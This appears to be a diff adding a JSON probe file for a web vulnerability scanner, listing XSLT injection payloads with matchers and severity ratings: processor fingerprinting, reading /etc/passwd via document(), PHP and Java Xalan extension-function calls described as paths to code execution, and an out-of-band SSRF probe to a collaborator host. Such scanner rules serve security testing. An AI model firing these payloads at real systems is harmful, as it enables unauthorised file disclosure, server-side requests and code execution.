@@ -1,0 +1,71 @@
+{
+  "category": "xslt_injection",
+  "contexts": {
+    "information_disclosure": {
+      "description": "XSLT injection for information disclosure -- inject XSLT elements to read files or extract server info via XML transformation",
+      "tech_match": ["XML", "XSLT", "Java", "PHP", ".NET", "libxslt"],
+      "param_match": ["xsl", "xslt", "transform", "stylesheet", "xml", "template"],
+      "probes": [
+        {
+          "payload": "<xsl:value-of select=\"system-property('xsl:vendor')\"/>",
+          "description": "XSLT vendor detection -- reveals processor (Xalan, Saxon, libxslt) for targeted attacks",
+          "matchers": [
+            {"type": "word", "words": ["Apache", "Xalan", "Saxon", "libxslt", "Microsoft", "GNOME"], "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "<xsl:value-of select=\"document('/etc/passwd')\"/>",
+          "description": "XSLT file read via document() -- reads local files if not restricted by XSLT processor security policy",
+          "matchers": [
+            {"type": "word", "words": ["root:x:0:0:", "root:!:0:0:"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 65
+        }
+      ]
+    },
+    "rce": {
+      "description": "XSLT injection for code execution -- use XSLT extension functions for arbitrary function calls",
+      "tech_match": ["Java", "PHP", "libxslt"],
+      "param_match": ["xsl", "xslt", "transform", "stylesheet"],
+      "probes": [
+        {
+          "payload": "<xsl:value-of select=\"php:function('phpversion')\"/>",
+          "description": "PHP XSLT function call -- php:function() extension calls PHP functions if registerPHPFunctions() enabled. Safe detection via phpversion().",
+          "matchers": [
+            {"type": "word", "words": ["8.", "7.", "5."], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70
+        },
+        {
+          "payload": "<xsl:value-of xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\" select=\"rt:getRuntime()\"/>",
+          "description": "Java Xalan XSLT Runtime access -- confirms Xalan Java extension namespace allows Runtime object access. Prerequisite for RCE.",
+          "matchers": [
+            {"type": "word", "words": ["Runtime", "java.lang"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 65
+        }
+      ]
+    },
+    "ssrf": {
+      "description": "XSLT SSRF -- use document() or unparsed-text() to make server-side requests to internal services",
+      "tech_match": ["XML", "XSLT", "Java"],
+      "param_match": ["xsl", "xslt", "transform"],
+      "probes": [
+        {
+          "payload": "<xsl:value-of select=\"document('http://COLLABORATOR/?xslt-ssrf')\"/>",
+          "description": "XSLT SSRF via document() -- forces processor to fetch external URL, confirms OOB connectivity",
+          "matchers": [
+            {"type": "status", "status": [200]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    }
+  }
+}
